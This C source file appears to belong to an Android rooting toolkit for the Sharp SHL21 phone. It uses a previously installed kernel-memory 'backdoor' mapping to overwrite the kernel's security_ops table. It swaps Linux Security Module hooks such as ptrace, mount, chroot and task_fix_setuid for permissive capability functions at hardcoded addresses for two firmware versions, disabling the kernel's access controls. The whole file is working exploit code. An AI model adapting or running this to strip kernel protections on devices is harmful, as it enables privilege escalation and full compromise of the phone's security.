#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/system_properties.h>
#define _LARGEFILE64_SOURCE
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

#include "device_database/device_database.h"
#include "backdoor_mmap.h"

#define SECURITY_OPS_OFFSET     3

#define NUM_SECURITY_OPS        174


typedef struct {
  unsigned long int lsm_func;
  unsigned long int cap_func;
} lsm_fix_t;

unsigned long int security_ops;
lsm_fix_t *lsm_fixes;
int n_lsm_fixes;

#define security_ops_01_00_09   0xc0e78c64
#define security_ops_01_01_02   0xc071f0f8

static lsm_fix_t lsm_fixes_01_00_09[] = {
  { 0xc0341e14, 0xc033fbbc },   // ptrace_access_check
  { 0xc0341e1c, 0xc033fb38 },   // ptrace_traceme
  { 0xc03422e4, 0xc0341a10 },   // sb_mount
  { 0xc0342284, 0xc0341a18 },   // sb_umount
  { 0xc0342120, 0xc0341a20 },   // sb_pivotroot
  { 0xc0342188, 0xc0341b08 },   // path_symlink
  { 0xc0342100, 0xc0341b38 },   // path_chroot
};

static int n_lsm_fixes_01_00_09 = sizeof (lsm_fixes_01_00_09) / sizeof (lsm_fixes_01_00_09[0]);

static lsm_fix_t lsm_fixes_01_01_02[] = {
  { 0xc0218454, 0xc0215c04 },   // ptrace_access_check
  { 0xc021845c, 0xc0215c9c },   // ptrace_traceme
  { 0xc0218c48, 0xc0216064 },   // bprm_set_creds
  { 0xc0218a70, 0xc0218064 },   // sb_mount
  { 0xc02188f0, 0xc021806c },   // sb_umount
  { 0xc0218880, 0xc0218074 },   // sb_pivotroot
  { 0xc021895c, 0xc021815c },   // path_symlink
  { 0xc02187ec, 0xc021817c },   // path_chmod
  { 0xc021878c, 0xc021818c },   // path_chroot
  { 0xc0218530, 0xc02165ac },   // task_fix_setuid
  { 0xc0218cf0, 0xc0218370 },   // socket_setsockopt
};

static int n_lsm_fixes_01_01_02 = sizeof (lsm_fixes_01_01_02) / sizeof (lsm_fixes_01_01_02[0]);

bool
unlock_lsm(void)
{
  unsigned long int *p;
  int count = 0;
  int i;

  p = backdoor_convert_to_mmaped_address((void *)security_ops);

  for (i = SECURITY_OPS_OFFSET; i < NUM_SECURITY_OPS; i++) {
    int j;

    for (j = 0; j < n_lsm_fixes; j++) {
      if (p[i] == lsm_fixes[j].lsm_func) {
        p[i] = lsm_fixes[j].cap_func;
        count++;
        break;
      }
    }
  }

  printf("  %d functions are fixed.\n", count);

  return count > 0;
}

static bool
do_unlock(void)
{
  bool ret;

  if (!backdoor_open_mmap()) {
    printf("Failed to mmap due to %s.\n", strerror(errno));
    printf("Run 'install_backdoor' first\n");

    return false;
  }

  ret = unlock_lsm();

  backdoor_close_mmap();
  return ret;
}

int
main(int argc, char **argv)
{
  switch (detect_device()) {
  case DEVICE_SHL21_01_00_09:
    security_ops = security_ops_01_00_09;
    lsm_fixes = lsm_fixes_01_00_09;
    n_lsm_fixes = n_lsm_fixes_01_00_09;
    break;

  case DEVICE_SHL21_01_01_02:
    security_ops = security_ops_01_01_02;
    lsm_fixes = lsm_fixes_01_01_02;
    n_lsm_fixes = n_lsm_fixes_01_01_02;
    break;

  default:
    print_reason_device_not_supported();
    return 1;
  }

  if (!do_unlock()) {
    printf("Failed to unlock LSM protect.\n");
    exit(EXIT_FAILURE);
  }

  exit(EXIT_SUCCESS);
}
/*
vi:ts=2:nowrap:ai:expandtab:sw=2
*/
